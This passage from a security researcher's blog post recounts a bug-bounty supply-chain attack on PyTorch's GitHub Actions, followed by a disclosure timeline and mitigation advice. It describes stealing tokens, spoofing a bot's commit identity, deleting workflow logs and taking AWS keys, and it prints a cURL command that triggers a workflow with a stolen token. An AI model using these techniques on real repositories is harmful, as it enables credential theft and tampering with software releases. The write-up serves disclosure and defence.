<figure><img data-attachment-id="605" data-permalink="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/image-13/" data-orig-file="https://johnstawinski.files.wordpress.com/2024/01/image-13.png" data-orig-size="1456,1530" data-comments-opened="1" data-image-meta="{&#34;aperture&#34;:&#34;0&#34;,&#34;credit&#34;:&#34;&#34;,&#34;camera&#34;:&#34;&#34;,&#34;caption&#34;:&#34;&#34;,&#34;created_timestamp&#34;:&#34;0&#34;,&#34;copyright&#34;:&#34;&#34;,&#34;focal_length&#34;:&#34;0&#34;,&#34;iso&#34;:&#34;0&#34;,&#34;shutter_speed&#34;:&#34;0&#34;,&#34;title&#34;:&#34;&#34;,&#34;orientation&#34;:&#34;0&#34;}" data-image-title="image-13" data-image-description="" data-image-caption="" data-medium-file="https://johnstawinski.files.wordpress.com/2024/01/image-13.png?w=285" data-large-file="https://johnstawinski.files.wordpress.com/2024/01/image-13.png?w=974" loading="lazy" width="1456" height="1530" src="https://johnstawinski.files.wordpress.com/2024/01/image-13.png" alt="" srcset="https://johnstawinski.files.wordpress.com/2024/01/image-13.png 1456w, https://johnstawinski.files.wordpress.com/2024/01/image-13.png?w=143&amp;h=150 143w, https://johnstawinski.files.wordpress.com/2024/01/image-13.png?w=285&amp;h=300 285w, https://johnstawinski.files.wordpress.com/2024/01/image-13.png?w=768&amp;h=807 768w, https://johnstawinski.files.wordpress.com/2024/01/image-13.png?w=974&amp;h=1024 974w" sizes="(max-width: 1456px) 100vw, 1456px"/></figure>



<p><em>The weekly.yml workflow used two PATs as secrets. This workflow called the _update-commit-hash workflow, which specified use of a GitHub-hosted runner.</em></p>



<p>Even though this workflow wouldn’t run on our runner, the <em>GITHUB_TOKENs</em> we could compromise had <em>actions:write</em> privileges. We could use the token to trigger workflows with the workflow_dispatch event. Could we use that to run our malicious code in the context of the <em>weekly.yml</em> workflow? </p>



<p>We had some ideas but weren’t sure whether they’d work in practice. <strong>So, we decided to find out.</strong></p>



<p>It turns out that you can’t use a <em>GITHUB_TOKEN</em> to modify workflow files. However, we discovered several creative…”workarounds”…that will let you add malicious code to a workflow using a <em>GITHUB_TOKEN</em>. In this scenario, <em>weekly.yml</em> used another workflow, which used a script outside the <em>.github/workflows</em> directory. We could add our code to this script in our branch. Then, <strong>we could trigger that workflow on our branch, which would execute our malicious code</strong>.</p>



<p>If this sounds confusing, don’t worry; it also confuses most bug bounty programs. Hopefully, we’ll get to provide an in-depth look at this and our other post-exploitation techniques at a certain <strong>security conference in LV, NV</strong>. If we don’t get that opportunity, we’ll cover our other methods in a future blog post.</p>



<p>Back to the action. To execute this phase of the attack, we compromised another <em>GITHUB_TOKEN</em> and used it to clone the PyTorch repository.<strong> We created our own branch, added our payload, and triggered the workflow.</strong></p>



<p>As a stealth bonus, we changed our git username in the commit to <em>pytorchmergebot</em>, so that our commits and workflows appeared to be triggered by the <em>pytorchmergebot</em> user, who interacted frequently with the PyTorch repository.</p>



<p>Our payload ran in the context of the <em>weekly.yml</em> workflow, which used the GitHub secrets we were after. The payload encrypted the two GitHub PATs and printed them to the workflow log output. We protected the private encryption key so that only we could perform decryption.</p>



<p>We triggered the <em>weekly.yml</em> workflow on our <em>citesting1112</em> branch using the following cURL command.</p>



<blockquote>
<p>curl -L \</p>



<p>  -X POST \</p>



<p>  -H “Accept: application/vnd.github+json” \</p>



<p>  -H “Authorization: Bearer $STOLEN_TOKEN” \</p>



<p>  -H “X-GitHub-Api-Version: 2022-11-28” \</p>



<p>  <a href="https://api.github.com/repos/pytorch/pytorch/actions/workflows/weekly.yml/dispatches" rel="nofollow">https://api.github.com/repos/pytorch/pytorch/actions/workflows/weekly.yml/dispatches</a> \</p>



<p>  -d ‘{“ref”:”citesting1112″}’</p>
</blockquote>



<p>Navigating to the PyTorch “Actions” tab, <strong>we saw our encrypted output </strong>containing the PATs in the results of the “Weekly” workflow.</p>



<figure><img data-attachment-id="604" data-permalink="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/image-15/" data-orig-file="https://johnstawinski.files.wordpress.com/2024/01/image-15.png" data-orig-size="1510,1234" data-comments-opened="1" data-image-meta="{&#34;aperture&#34;:&#34;0&#34;,&#34;credit&#34;:&#34;&#34;,&#34;camera&#34;:&#34;&#34;,&#34;caption&#34;:&#34;&#34;,&#34;created_timestamp&#34;:&#34;0&#34;,&#34;copyright&#34;:&#34;&#34;,&#34;focal_length&#34;:&#34;0&#34;,&#34;iso&#34;:&#34;0&#34;,&#34;shutter_speed&#34;:&#34;0&#34;,&#34;title&#34;:&#34;&#34;,&#34;orientation&#34;:&#34;0&#34;}" data-image-title="image-15" data-image-description="" data-image-caption="" data-medium-file="https://johnstawinski.files.wordpress.com/2024/01/image-15.png?w=300" data-large-file="https://johnstawinski.files.wordpress.com/2024/01/image-15.png?w=1024" loading="lazy" width="1510" height="1234" src="https://johnstawinski.files.wordpress.com/2024/01/image-15.png" alt="" srcset="https://johnstawinski.files.wordpress.com/2024/01/image-15.png 1510w, https://johnstawinski.files.wordpress.com/2024/01/image-15.png?w=150&amp;h=123 150w, https://johnstawinski.files.wordpress.com/2024/01/image-15.png?w=300&amp;h=245 300w, https://johnstawinski.files.wordpress.com/2024/01/image-15.png?w=768&amp;h=628 768w, https://johnstawinski.files.wordpress.com/2024/01/image-15.png?w=1024&amp;h=837 1024w" sizes="(max-width: 1510px) 100vw, 1510px"/></figure>



<p>Finally, we canceled the workflow run and deleted the logs.</p>



<h3 id="pat-access">PAT Access</h3>



<p>After <strong>decrypting the GitHub PATs</strong>, we enumerated their access with Gato.</p>



<figure><img data-attachment-id="606" data-permalink="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/image-14/" data-orig-file="https://johnstawinski.files.wordpress.com/2024/01/image-14.png" data-orig-size="1600,486" data-comments-opened="1" data-image-meta="{&#34;aperture&#34;:&#34;0&#34;,&#34;credit&#34;:&#34;&#34;,&#34;camera&#34;:&#34;&#34;,&#34;caption&#34;:&#34;&#34;,&#34;created_timestamp&#34;:&#34;0&#34;,&#34;copyright&#34;:&#34;&#34;,&#34;focal_length&#34;:&#34;0&#34;,&#34;iso&#34;:&#34;0&#34;,&#34;shutter_speed&#34;:&#34;0&#34;,&#34;title&#34;:&#34;&#34;,&#34;orientation&#34;:&#34;0&#34;}" data-image-title="image-14" data-image-description="" data-image-caption="" data-medium-file="https://johnstawinski.files.wordpress.com/2024/01/image-14.png?w=300" data-large-file="https://johnstawinski.files.wordpress.com/2024/01/image-14.png?w=1024" loading="lazy" width="1600" height="486" src="https://johnstawinski.files.wordpress.com/2024/01/image-14.png" alt="" srcset="https://johnstawinski.files.wordpress.com/2024/01/image-14.png 1600w, https://johnstawinski.files.wordpress.com/2024/01/image-14.png?w=150&amp;h=46 150w, https://johnstawinski.files.wordpress.com/2024/01/image-14.png?w=300&amp;h=91 300w, https://johnstawinski.files.wordpress.com/2024/01/image-14.png?w=768&amp;h=233 768w, https://johnstawinski.files.wordpress.com/2024/01/image-14.png?w=1024&amp;h=311 1024w" sizes="(max-width: 1600px) 100vw, 1600px"/></figure>



<p><em>We decrypted the PATs with our private key.</em></p>



<p>Gato revealed the PATs had access to over <strong>93 repositories within the PyTorch organization</strong>, including many private repos and administrative access over several. These PATs provided <strong>multiple paths to supply chain compromise</strong>. </p>



<p>For example, if an attacker didn’t want to bother with tampering releases, they could likely add code directly to the main branch of PyTorch. The main branch was protected, but the PAT belonging to <em>pytorchbot</em> could create a new branch and add its own code, and then the PAT belonging to <em>pytorchupdatebot</em> could approve the PR. We could then use <em>pytorchmergebot</em> to trigger the merge.</p>



<p>We didn’t use that attack path to add code to the main branch, but existing PyTorch PRs indicated it was possible. Even if an attacker couldn’t push directly to the main branch, there are other paths to supply chain compromise.</p>



<p>If the threat actor wanted to be more stealthy, they could add their malicious code to one of the other private or public repositories used by PyTorch within the PyTorch organization. These repositories had less visibility and were less likely to be closely reviewed. Or, they could smuggle their code into a feature branch, or steal more secrets, or do any number of creative techniques to compromise the PyTorch supply chain. </p>



<h3 id="aws-access">AWS Access</h3>



<p>To prove that the PAT compromise was not a one-off, we decided to steal more secrets – this time, AWS keys.</p>



<p>We won’t bore you with all the details, but we executed a similar attack to the one above to steal the <em>aws-pytorch-uploader-secret-access-key</em> and <em>aws-access-key-id</em> belonging to the <em>pytorchbot</em> AWS user. These AWS keys had privileges to upload PyTorch releases to AWS, providing another path to backdoor PyTorch releases. The impact of this attack would depend on the sources that pulled releases from AWS and the other assets in this AWS account.</p>



<figure><img data-attachment-id="598" data-permalink="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/image-5/" data-orig-file="https://johnstawinski.files.wordpress.com/2024/01/image-5.png" data-orig-size="1600,355" data-comments-opened="1" data-image-meta="{&#34;aperture&#34;:&#34;0&#34;,&#34;credit&#34;:&#34;&#34;,&#34;camera&#34;:&#34;&#34;,&#34;caption&#34;:&#34;&#34;,&#34;created_timestamp&#34;:&#34;0&#34;,&#34;copyright&#34;:&#34;&#34;,&#34;focal_length&#34;:&#34;0&#34;,&#34;iso&#34;:&#34;0&#34;,&#34;shutter_speed&#34;:&#34;0&#34;,&#34;title&#34;:&#34;&#34;,&#34;orientation&#34;:&#34;0&#34;}" data-image-title="image-5" data-image-description="" data-image-caption="" data-medium-file="https://johnstawinski.files.wordpress.com/2024/01/image-5.png?w=300" data-large-file="https://johnstawinski.files.wordpress.com/2024/01/image-5.png?w=1024" loading="lazy" width="1600" height="355" src="https://johnstawinski.files.wordpress.com/2024/01/image-5.png" alt="" srcset="https://johnstawinski.files.wordpress.com/2024/01/image-5.png 1600w, https://johnstawinski.files.wordpress.com/2024/01/image-5.png?w=150&amp;h=33 150w, https://johnstawinski.files.wordpress.com/2024/01/image-5.png?w=300&amp;h=67 300w, https://johnstawinski.files.wordpress.com/2024/01/image-5.png?w=768&amp;h=170 768w, https://johnstawinski.files.wordpress.com/2024/01/image-5.png?w=1024&amp;h=227 1024w" sizes="(max-width: 1600px) 100vw, 1600px"/></figure>



<p><em>We used the AWS CLI to confirm the AWS credentials belonged to the pytorchbot AWS user.</em></p>



<figure><img data-attachment-id="602" data-permalink="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/image-9/" data-orig-file="https://johnstawinski.files.wordpress.com/2024/01/image-9.png" data-orig-size="1194,1192" data-comments-opened="1" data-image-meta="{&#34;aperture&#34;:&#34;0&#34;,&#34;credit&#34;:&#34;&#34;,&#34;camera&#34;:&#34;&#34;,&#34;caption&#34;:&#34;&#34;,&#34;created_timestamp&#34;:&#34;0&#34;,&#34;copyright&#34;:&#34;&#34;,&#34;focal_length&#34;:&#34;0&#34;,&#34;iso&#34;:&#34;0&#34;,&#34;shutter_speed&#34;:&#34;0&#34;,&#34;title&#34;:&#34;&#34;,&#34;orientation&#34;:&#34;0&#34;}" data-image-title="image-9" data-image-description="" data-image-caption="" data-medium-file="https://johnstawinski.files.wordpress.com/2024/01/image-9.png?w=300" data-large-file="https://johnstawinski.files.wordpress.com/2024/01/image-9.png?w=1024" loading="lazy" width="1194" height="1192" src="https://johnstawinski.files.wordpress.com/2024/01/image-9.png" alt="" srcset="https://johnstawinski.files.wordpress.com/2024/01/image-9.png 1194w, https://johnstawinski.files.wordpress.com/2024/01/image-9.png?w=150&amp;h=150 150w, https://johnstawinski.files.wordpress.com/2024/01/image-9.png?w=300&amp;h=300 300w, https://johnstawinski.files.wordpress.com/2024/01/image-9.png?w=768&amp;h=767 768w, https://johnstawinski.files.wordpress.com/2024/01/image-9.png?w=1024&amp;h=1022 1024w" sizes="(max-width: 1194px) 100vw, 1194px"/></figure>



<p><em>We listed the contents of the “pytorch” bucket, revealing many sensitive artifacts, including PyTorch releases.</em></p>



<figure><img data-attachment-id="600" data-permalink="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/image-8/" data-orig-file="https://johnstawinski.files.wordpress.com/2024/01/image-8.png" data-orig-size="1120,1124" data-comments-opened="1" data-image-meta="{&#34;aperture&#34;:&#34;0&#34;,&#34;credit&#34;:&#34;&#34;,&#34;camera&#34;:&#34;&#34;,&#34;caption&#34;:&#34;&#34;,&#34;created_timestamp&#34;:&#34;0&#34;,&#34;copyright&#34;:&#34;&#34;,&#34;focal_length&#34;:&#34;0&#34;,&#34;iso&#34;:&#34;0&#34;,&#34;shutter_speed&#34;:&#34;0&#34;,&#34;title&#34;:&#34;&#34;,&#34;orientation&#34;:&#34;0&#34;}" data-image-title="image-8" data-image-description="" data-image-caption="" data-medium-file="https://johnstawinski.files.wordpress.com/2024/01/image-8.png?w=300" data-large-file="https://johnstawinski.files.wordpress.com/2024/01/image-8.png?w=1020" loading="lazy" width="1120" height="1124" src="https://johnstawinski.files.wordpress.com/2024/01/image-8.png" alt="" srcset="https://johnstawinski.files.wordpress.com/2024/01/image-8.png 1120w, https://johnstawinski.files.wordpress.com/2024/01/image-8.png?w=150&amp;h=150 150w, https://johnstawinski.files.wordpress.com/2024/01/image-8.png?w=300&amp;h=300 300w, https://johnstawinski.files.wordpress.com/2024/01/image-8.png?w=768&amp;h=771 768w, https://johnstawinski.files.wordpress.com/2024/01/image-8.png?w=1020&amp;h=1024 1020w" sizes="(max-width: 1120px) 100vw, 1120px"/></figure>



<p><em>We discovered production PyTorch artifacts and confirmed write access to S3. We are still unsure as to which sources use these AWS releases.</em></p>



<p>There were other sets of AWS keys, GitHub PATs, and various credentials we could have stolen, but we believed we had a clear demonstration of impact at this point. Given the critical nature of the vulnerability, we wanted to submit the report as soon as possible before one of PyTorch’s 3,500 contributors decided to make a deal with a foreign adversary.</p>



<figure><img data-attachment-id="596" data-permalink="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/image-4/" data-orig-file="https://johnstawinski.files.wordpress.com/2024/01/image-4.png" data-orig-size="987,1600" data-comments-opened="1" data-image-meta="{&#34;aperture&#34;:&#34;0&#34;,&#34;credit&#34;:&#34;&#34;,&#34;camera&#34;:&#34;&#34;,&#34;caption&#34;:&#34;&#34;,&#34;created_timestamp&#34;:&#34;0&#34;,&#34;copyright&#34;:&#34;&#34;,&#34;focal_length&#34;:&#34;0&#34;,&#34;iso&#34;:&#34;0&#34;,&#34;shutter_speed&#34;:&#34;0&#34;,&#34;title&#34;:&#34;&#34;,&#34;orientation&#34;:&#34;0&#34;}" data-image-title="image-4" data-image-description="" data-image-caption="" data-medium-file="https://johnstawinski.files.wordpress.com/2024/01/image-4.png?w=185" data-large-file="https://johnstawinski.files.wordpress.com/2024/01/image-4.png?w=632" loading="lazy" width="987" height="1600" src="https://johnstawinski.files.wordpress.com/2024/01/image-4.png" alt="" srcset="https://johnstawinski.files.wordpress.com/2024/01/image-4.png 987w, https://johnstawinski.files.wordpress.com/2024/01/image-4.png?w=93&amp;h=150 93w, https://johnstawinski.files.wordpress.com/2024/01/image-4.png?w=185&amp;h=300 185w, https://johnstawinski.files.wordpress.com/2024/01/image-4.png?w=768&amp;h=1245 768w" sizes="(max-width: 987px) 100vw, 987px"/></figure>



<p><em>A full attack path diagram.</em></p>







<p>Overall, the PyTorch submission process was blah, to use a technical term. They frequently had long response times, and their fixes were questionable. </p>



<p>We also learned this wasn’t the first time they had issues with self-hosted runners – earlier in 2023, Marcus Young executed a pipeline attack to gain RCE on a single PyTorch runner. Marcus did not perform the post-exploitation techniques we used to demonstrate impact, but PyTorch still should have locked down their runners after his submission. <a href="https://marcyoung.us/post/zuckerpunch/">Marcus’ report</a> earned him a $10,000 bounty. </p>



<p>We haven’t investigated PyTorch’s new setup enough to provide our opinion on their solution to securing their runners. Rather than require approval for contributor’s fork PRs, PyTorch opted to implement a layer of controls to prevent abuse. </p>



<h2 id="timeline">Timeline</h2>



<p>August 9th, 2023 – Report submitted to Meta bug bounty</p>



<p>August 10th, 2023 – Report “sent to appropriate product team”</p>



<p>September 8th, 2023 – We reached out to Meta to ask for an update</p>



<p>September 12th, 2023 – Meta said there is no update to provide</p>



<p>October 16th, 2023 – Meta said “we consider the issue mitigated, if you think this wasn’t fully mitigated, please let us know.”</p>



<p>October 16th, 2023 – We responded by saying we believed the issue had not been fully mitigated.</p>



<p>November 1st, 2023 – We reached out to Meta, asking for another update.</p>



<p>November 21st, 2023 – Meta responded, saying they reached out to a team member to provide an update.</p>



<p>December 7th, 2023 – After not receiving an update, we sent a strongly worded message to Meta, expressing our concerns about the disclosure process and the delay in remediation.</p>



<p>December 7th, 2023 – Meta responded, saying they believed the issue was mitigated and the delay was regarding the bounty.</p>



<p>December 7th, 2023 – Several back-and-forths ensued discussing remediation.</p>



<p>December 15th, 2023 – Meta awarded a $5000 bounty, plus 10% due to the delay in payout.</p>



<p>December 15th, 2023 – Meta provided more detail as to the remediation steps they performed after the initial vulnerability disclosure and offered to set up a call if we had more questions.</p>



<p>December 16th, 2023 – We responded, opting not to set up a call, and asked a question about bounty payout (at this point, we were pretty done with looking at PyTorch).</p>







<p>The easiest way to mitigate this class of vulnerability is to change the default setting of ‘Require approval for first-time contributors’ to ‘Require approval for all outside collaborators’. It is a no-brainer for any public repository that uses self-hosted runners to ensure they use the restrictive setting, although PyTorch seems to disagree.</p>



<p>If workflows from fork-PRs are necessary, organizations should only use GitHub-hosted runners. If self-hosted runners are also necessary, use isolated, ephemeral runners and ensure you know the risks involved.</p>



<p>It is challenging to design a solution allowing anyone to run arbitrary code on your infrastructure without risks, especially in an organization like PyTorch that thrives off community contributions. </p>







<p>The issues surrounding these attack paths are not unique to PyTorch. They’re not unique to ML repositories or even to GitHub. We’ve repeatedly demonstrated supply chain weaknesses by exploiting CI/CD vulnerabilities in the world’s <a href="https://johnstawinski.com/2024/01/05/worse-than-solarwinds-three-steps-to-hack-blockchains-github-and-ml-through-github-actions/">most advanced technological organizations</a> across several CI/CD platforms, and those are only a small subset of the greater attack surface. </p>



<p>Threat actors are starting to catch on, as shown by the year-over-year increase in supply chain attacks. Security researchers won’t always be able to find these vulnerabilities before malicious attackers.</p>



<p>But in this case, the researchers got there first.</p>



<p><em>Want to hear more? Subscribe to the <a href="https://johnstawinski.ck.page/2034b623ad">official John IV newsletter</a></em> <em>to receive live, monthly updates of my interests and passions.</em></p>







<ul>
<li><a href="https://johnstawinski.com/2024/01/05/worse-than-solarwinds-three-steps-to-hack-blockchains-github-and-ml-through-github-actions/">https://johnstawinski.com/2024/01/05/worse-than-solarwinds-three-steps-to-hack-blockchains-github-and-ml-through-github-actions/</a></li>



<li><a href="https://adnanthekhan.com/2023/12/20/one-supply-chain-attack-to-rule-them-all/">https://adnanthekhan.com/2023/12/20/one-supply-chain-attack-to-rule-them-all/</a></li>



<li><a href="https://marcyoung.us/post/zuckerpunch/">https://marcyoung.us/post/zuckerpunch/</a></li>



<li><a href="https://www.praetorian.com/blog/self-hosted-github-runners-are-backdoors/">https://www.praetorian.com/blog/self-hosted-github-runners-are-backdoors/</a></li>



<li><a href="https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/">https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/</a></li>



<li><a href="https://github.com/nikitastupin/pwnhub">https://github.com/nikitastupin/pwnhub</a></li>



<li><a href="https://0xn3va.gitbook.io/cheat-sheets/ci-cd/github/actions">https://0xn3va.gitbook.io/cheat-sheets/ci-cd/github/actions</a></li>



<li><a href="https://owasp.org/www-project-top-10-ci-cd-security-risks/">https://owasp.org/www-project-top-10-ci-cd-security-risks/</a></li>
</ul>
</div></div>
  </body>
</html>
